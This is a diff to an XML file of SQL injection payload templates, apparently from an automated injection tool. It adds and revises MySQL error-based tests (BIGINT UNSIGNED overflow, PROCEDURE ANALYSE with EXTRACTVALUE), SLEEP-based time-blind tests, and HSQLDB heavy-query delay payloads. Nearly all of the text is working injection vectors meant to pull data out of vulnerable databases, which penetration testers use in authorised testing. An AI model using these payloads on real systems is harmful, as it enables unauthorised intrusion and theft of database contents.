@@ -1253,6 +1253,26 @@ Formats:
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.5 AND error-based - WHERE or HAVING clause (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>4</level>
+        <risk>0</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <request>
+            <payload>AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 4.1 AND error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
         <level>2</level>
@@ -1471,6 +1491,26 @@ Formats:
     </test>
 
     <test>
+        <title>MySQL &gt;= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>2</risk>
+        <clause>1</clause>
+        <where>1</where>
+        <vector>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <request>
+            <payload>OR (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
+        </details>
+    </test>
+
+    <test>
         <title>MySQL &gt;= 4.1 OR error-based - WHERE or HAVING clause</title>
         <stype>2</stype>
         <level>2</level>
@@ -1653,6 +1693,27 @@ Formats:
     -->
     <!-- End of error-based tests - WHERE or HAVING clause -->
 
+    <!-- Error-based tests - After ORDER BY...LIMIT... -->
+    <test>
+        <title>MySQL &gt;= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
+        <stype>2</stype>
+        <level>2</level>
+        <risk>0</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1</where>
+        <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]')),1)</vector>
+        <request>
+            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\','[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]')),1)</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+    <!-- End of error-based tests - After ORDER BY...LIMIT... -->
 
     <!-- Error-based tests - Parameter replace -->
     <test>
@@ -1712,6 +1773,26 @@ Formats:
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>0</risk>
+        <clause>1,2,3</clause>
+        <where>3</where>
+        <vector>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <request>
+            <payload>(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
         </details>
     </test>
 
@@ -1874,6 +1955,26 @@ Formats:
         <details>
             <dbms>MySQL</dbms>
             <dbms_version>&gt;= 5.1</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt;= 5.5 error-based - GROUP BY and ORDER BY clauses (BIGINT UNSIGNED)</title>
+        <stype>2</stype>
+        <level>5</level>
+        <risk>0</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</vector>
+        <request>
+            <payload>,(SELECT 2*(IF((SELECT * FROM (SELECT CONCAT('[DELIMITER_START]',(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN 1 ELSE 0 END)),'[DELIMITER_STOP]','x'))s), 8446744073709551610, 8446744073709551610)))</payload>
+        </request>
+        <response>
+            <grep>[DELIMITER_START](?P&lt;result&gt;.*?)[DELIMITER_STOP]</grep>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt;= 5.5</dbms_version>
         </details>
     </test>
 
@@ -2314,9 +2415,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>;CALL CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000) END</vector>
+        <vector>;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) END</vector>
         <request>
-            <payload>;CALL REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000)</payload>
+            <payload>;CALL REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2335,9 +2436,9 @@ Formats:
         <risk>0</risk>
         <clause>0</clause>
         <where>1</where>
-        <vector>;CALL CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) END</vector>
+        <vector>;CALL CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) END</vector>
         <request>
-            <payload>;CALL REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000)</payload>
+            <payload>;CALL REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2353,6 +2454,47 @@ Formats:
 
 
     <!-- AND time-based blind tests -->
+    <test>
+        <title>MySQL &gt; 5.0.11 AND time-based blind (SELECT)</title>
+        <stype>5</stype>
+        <level>1</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+
+    <test>
+        <title>MySQL &gt; 5.0.11 AND time-based blind (SELECT - comment)</title>
+        <stype>5</stype>
+        <level>4</level>
+        <risk>1</risk>
+        <clause>1,2,3</clause>
+        <where>1</where>
+        <vector>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME])))))[RANDSTR])</vector>
+        <request>
+            <payload>AND (SELECT * FROM (SELECT(SLEEP([SLEEPTIME])))[RANDSTR])</payload>
+            <comment>#</comment>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+
     <test>
         <title>MySQL &gt; 5.0.11 AND time-based blind</title>
         <stype>5</stype>
@@ -2823,9 +2965,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000) ELSE '[RANDSTR]' END</vector>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>AND '[RANDSTR]'=REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000)</payload>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -2843,9 +2985,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000) ELSE '[RANDSTR]' END</vector>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>AND '[RANDSTR]'=REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000)</payload>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2864,9 +3006,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>AND '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000)</payload>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -2884,9 +3026,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <vector>AND '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>AND '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000)</payload>
+            <payload>AND '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -2899,7 +3041,6 @@ Formats:
     </test>
     <!-- TODO: if possible, add payload for Microsoft Access -->
     <!-- End of AND time-based blind tests -->
-
 
     <!-- OR time-based blind tests -->
     <test>
@@ -3124,9 +3265,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000) ELSE '[RANDSTR]' END</vector>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>OR '[RANDSTR]'=REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000)</payload>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -3144,9 +3285,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000) ELSE '[RANDSTR]' END</vector>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>OR '[RANDSTR]'=REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000)</payload>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]000000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -3165,9 +3306,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>OR '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000)</payload>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -3185,9 +3326,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END</vector>
+        <vector>OR '[RANDSTR]'=CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END</vector>
         <request>
-            <payload>OR '[RANDSTR]'=REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000)</payload>
+            <payload>OR '[RANDSTR]'=REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -3201,6 +3342,27 @@ Formats:
     <!-- TODO: if possible, add payload for Microsoft Access -->
     <!-- End of OR time-based blind tests -->
 
+    <!-- Time-based tests - After ORDER BY...LIMIT... -->
+    <test>
+        <title>MySQL &gt;= 5.1 time-based blind - PROCEDURE ANALYSE (EXTRACTVALUE)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,2,3,4,5</clause>
+        <where>1</where>
+        <vector>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])))),1)</vector>
+        <request>
+            <payload>PROCEDURE ANALYSE(EXTRACTVALUE([RANDNUM],CONCAT('\',(BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))))),1)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+            <dbms_version>&gt; 5.0.11</dbms_version>
+        </details>
+    </test>
+    <!-- Time-based tests - After ORDER BY...LIMIT... -->
 
     <!-- Time-based blind tests - Parameter replace -->
     <test>
@@ -3524,9 +3686,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -3544,9 +3706,9 @@ Formats:
         <risk>2</risk>
         <clause>1,2,3</clause>
         <where>1</where>
-        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</vector>
+        <vector>(SELECT (CASE WHEN ([INFERENCE]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</vector>
         <request>
-            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</payload>
+            <payload>(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL) ELSE '[RANDSTR]' END) FROM (VALUES(0)))</payload>
         </request>
         <response>
             <time>[SLEEPTIME]</time>
@@ -3744,9 +3906,9 @@ Formats:
         <risk>2</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</vector>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</vector>
         <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</payload>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(RIGHT(CHAR([RANDNUM]),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM INFORMATION_SCHEMA.SYSTEM_USERS) END) FROM INFORMATION_SCHEMA.SYSTEM_USERS)</payload>
             <comment>--</comment>
         </request>
         <response>
@@ -3765,9 +3927,9 @@ Formats:
         <risk>2</risk>
         <clause>2,3</clause>
         <where>1</where>
-        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))</vector>
+        <vector>,(SELECT (CASE WHEN ([INFERENCE]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))</vector>
         <request>
-            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REPEAT(LEFT(CRYPT_KEY('AES',null),0),[SLEEPTIME]00000000))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))</payload>
+            <payload>,(SELECT (CASE WHEN ([RANDNUM]=[RANDNUM]) THEN (ASCII(REGEXP_SUBSTRING(REPEAT(LEFT(CRYPT_KEY('AES',NULL),0),[SLEEPTIME]00000000),NULL))) ELSE [RANDNUM]/(SELECT 0 FROM (VALUES(0))) END) FROM (VALUES(0)))</payload>
         </request>
         <response>
             <time>[DELAYED]</time>
